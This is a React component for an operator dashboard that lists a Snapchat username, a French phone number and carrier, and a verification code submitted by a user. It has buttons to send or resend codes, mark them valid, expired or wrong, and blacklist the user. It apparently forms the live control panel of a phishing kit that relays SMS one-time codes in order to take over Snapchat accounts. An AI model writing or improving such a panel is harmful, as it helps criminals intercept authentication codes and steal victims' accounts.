import { motion } from "framer-motion";
import { Ban } from "lucide-react";

const opColor = {
  SFR: { badge: "bg-red-500/10 text-red-400 border-red-500/25", btn: "bg-red-500 hover:bg-red-600 text-white", text: "text-red-400" },
  Bouygues: { badge: "bg-blue-500/10 text-blue-400 border-blue-500/25", btn: "bg-blue-500 hover:bg-blue-600 text-white", text: "text-blue-400" },
  Orange: { badge: "bg-orange-500/10 text-orange-400 border-orange-500/25", btn: "bg-orange-500 hover:bg-orange-600 text-white", text: "text-orange-400" },
};
const fallback = { badge: "bg-secondary/40 text-muted-foreground border-border", btn: "bg-primary hover:bg-primary/90 text-primary-foreground", text: "text-primary" };

const formatPhone = (tel) => {
  const t = String(tel || "").replace(/\D/g, "");
  return t.replace(/(\d{2})(?=\d)/g, "$1 ").trim();
};

export default function ClaimedActions({ submission, onAction, onBlacklist, busyKey }) {
  const sub = submission;
  const c = opColor[sub.operateur] || fallback;

  const actions = [
    { id: "code_ready", label: "Send code (4)", cls: c.btn },
    { id: "code6", label: "Resend (6 digits)", cls: "bg-purple-500/10 text-purple-400 border border-purple-500/25 hover:bg-purple-500/20" },
    { id: "code6sfr", label: "Resend (SFR)", cls: "bg-red-500/10 text-red-400 border border-red-500/25 hover:bg-red-500/20" },
    { id: "code6orange", label: "Resend (Orange)", cls: "bg-orange-500/10 text-orange-400 border border-orange-500/25 hover:bg-orange-500/20" },
    { id: "valid", label: "Validate", cls: "bg-green-500/10 text-green-400 border border-green-500/25 hover:bg-green-500/20" },
    { id: "wrong", label: "Wrong number", cls: "bg-red-500/10 text-red-400 border border-red-500/25 hover:bg-red-500/20" },
    { id: "expired", label: "Code expired", cls: "bg-yellow-500/10 text-yellow-400 border border-yellow-500/25 hover:bg-yellow-500/20" },
  ];

  return (
    <motion.div
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      className="bg-card border border-border rounded-2xl p-6 flex flex-col min-h-[60vh]"
    >
      <div className="flex items-center justify-between mb-4">
        <div>
          <span className={`text-[10px] font-bold uppercase tracking-wider ${c.text}`}>Managing request</span>
          <h2 className="text-lg font-bold text-foreground">{sub.snapchat}</h2>
        </div>
        <span className="text-[11px] text-muted-foreground font-mono">#{sub.id.slice(-6)}</span>
      </div>

      <div className="flex items-center gap-2 mb-1">
        <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full border ${c.badge}`}>{sub.operateur}</span>
      </div>
      <p className="text-2xl font-bold text-foreground font-mono tracking-tight mb-5">{formatPhone(sub.telephone)}</p>

      {sub.received_code ? (
        <div className="rounded-xl border border-primary/30 bg-primary/10 px-4 py-3">
          <div className="flex items-center justify-between">
            <span className="text-[10px] font-bold uppercase tracking-wider text-primary">Code reçu</span>
            {sub.code_received_at && (
              <span className="text-[10px] text-muted-foreground">
                {new Date(sub.code_received_at).toLocaleTimeString("fr-FR", { hour: "2-digit", minute: "2-digit" })}
              </span>
            )}
          </div>
          <p className="mt-1 text-2xl font-bold text-foreground font-mono tracking-[0.3em]">{sub.received_code}</p>
        </div>
      ) : (
        <div className="rounded-xl border border-dashed border-border px-4 py-3">
          <span className="text-[11px] text-muted-foreground">En attente du code de l'utilisateur…</span>
        </div>
      )}

      <div className="grid grid-cols-2 gap-2.5 mt-6">
        {actions.map((a) => (
          <button
            key={a.id}
            disabled={!!busyKey}
            onClick={() => onAction(a.id)}
            className={`text-xs font-semibold py-2.5 rounded-lg transition-colors disabled:opacity-50 flex items-center justify-center gap-1.5 ${a.cls}`}
          >
            {busyKey === a.id ? (
              <span className="w-3.5 h-3.5 border-2 border-current/30 border-t-current rounded-full animate-spin" />
            ) : a.label}
          </button>
        ))}
        <button
          disabled={!!busyKey}
          onClick={onBlacklist}
          className="col-span-2 bg-red-500/10 text-red-400 border border-red-500/25 hover:bg-red-500/20 text-xs font-semibold py-2.5 rounded-lg transition-colors disabled:opacity-50 flex items-center justify-center gap-1.5"
        >
          <Ban className="w-3.5 h-3.5" /> Instant blacklist
        </button>
      </div>
    </motion.div>
  );
}